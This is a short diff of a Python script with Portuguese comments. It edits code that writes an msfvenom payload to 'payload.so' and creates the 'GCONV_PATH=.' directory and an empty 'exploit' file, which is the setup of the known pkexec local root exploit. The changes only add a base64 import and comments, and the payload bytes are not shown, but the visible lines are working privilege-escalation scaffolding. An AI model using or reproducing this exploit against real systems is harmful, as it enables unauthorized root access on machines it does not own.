@@ -4,6 +4,7 @@ from ctypes.util import find_library
 import os
 import sys
 import shutil
+import base64  # Importando o módulo base64
 
 # Definir o payload (como já está no seu código)
 payload_byte_msfvenom = b'''
@@ -41,9 +42,9 @@ with open('payload.so', 'wb') as f:
 os.chmod('payload.so', 755)
 
 # Criando diretórios necessários
-os.mkdir("GCONV_PATH=.")
+os.mkdir("GCONV_PATH=.")  # Criando diretório
 with open('GCONV_PATH=./exploit', 'wb') as f:
-    f.write(b'')
+    f.write(b'')  # Arquivo vazio
 os.chmod('GCONV_PATH=./exploit', 755)
 
 # Criando o diretório 'exploit'
